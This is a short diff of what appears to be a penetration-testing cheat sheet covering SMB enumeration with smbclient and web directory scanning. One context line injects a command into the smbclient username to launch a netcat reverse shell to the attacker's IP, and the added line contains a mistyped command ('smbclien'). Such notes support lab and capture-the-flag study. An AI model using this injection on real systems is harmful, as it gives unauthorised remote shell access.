@@ -28,6 +28,7 @@ $ smbclient -N //IP/tmp -> dir, put
 $ add [global] client min protocol=NT1
 $ smbclient -N //IP/tmp --option='client min protocol=NT1'
 $ smbclient //IP/tmp -U "./=`nohup nc -e /bin/sh IP 443`" -> run nc
+$ smbclien \\\\$IP\\dir\\
 
 Port 80 web server
 $ dirsearch -u http://yourip, OR
